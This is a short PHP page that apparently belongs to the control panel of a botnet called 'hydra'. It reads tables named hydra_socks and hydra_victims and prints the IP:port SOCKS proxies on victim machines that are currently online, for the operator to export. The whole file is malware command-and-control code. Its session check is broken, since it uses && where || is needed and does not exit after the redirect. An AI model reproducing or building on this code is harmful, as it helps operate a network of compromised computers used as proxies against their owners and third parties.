<?php
	session_start();
	if(!isset($_SESSION['hydra_loggedin']) && $_SESSION['hydra_loggedin'] != 1)
	{
		header("Location: http://www.google.com");
	}
	include("inc/config.php");
	$query = mysql_query("SELECT * FROM hydra_socks");
	echo '<h2>Export online Socks</h2><table class="smalltable">';
	while($ds = mysql_fetch_array($query))
	{
		$query2 = mysql_query("SELECT * FROM hydra_victims WHERE HWID = '".mysql_real_escape_string($ds['hwid'])."' AND ConTime > ".(time()-$time_on)."");
		$socks_online = mysql_num_rows($query2);
		if($socks_online >= 1)
		{
			echo '<tr><td>'.$ds['ip'].":".$ds['port'].'</td></tr>';
		}
		else
		{
		}
	}
	echo '</table>';
?>